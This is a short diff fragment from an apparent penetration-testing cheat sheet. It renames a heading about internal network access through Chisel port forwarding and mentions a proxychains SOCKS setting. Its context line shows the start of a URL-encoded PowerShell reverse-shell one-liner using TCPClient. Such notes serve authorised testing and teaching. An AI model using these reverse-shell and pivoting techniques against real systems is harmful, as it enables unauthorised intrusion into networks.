@@ -38,7 +38,7 @@ powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPCl
 ```
 
 
-# Internal Network Acess (Reverse Port Forwarding)
+# Internal Network Acess (Port Forwarding)
 #### Chisel :
 > Make sure to add `socks5	127.0.0.1 1080` in **/etc/proxychains4.conf** file.
 ```powershell
